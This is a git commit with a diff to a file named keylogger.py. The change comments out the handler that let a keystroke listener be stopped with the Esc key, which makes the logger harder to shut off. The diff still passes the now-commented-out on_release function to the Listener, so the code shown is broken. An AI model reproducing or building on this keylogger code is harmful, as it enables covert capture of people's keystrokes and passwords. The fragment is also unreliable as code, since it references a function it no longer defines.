d07b32f5c28071e1c00e2a81a7b46c27147225fe
Angelo Nazzaro <58223071+sl1mSha4dey@users.noreply.github.com>
2022-08-10 19:20:10 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -76,9 +76,10 @@ def write_file(keys):
     check_file_size()
 
 
-def on_release(key):
-    if key == Key.esc:
-        return False #stop the listener
+# decomment for debug purposes    
+# def on_release(key):
+#    if key == Key.esc:
+#        return False #stop the listener
 
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
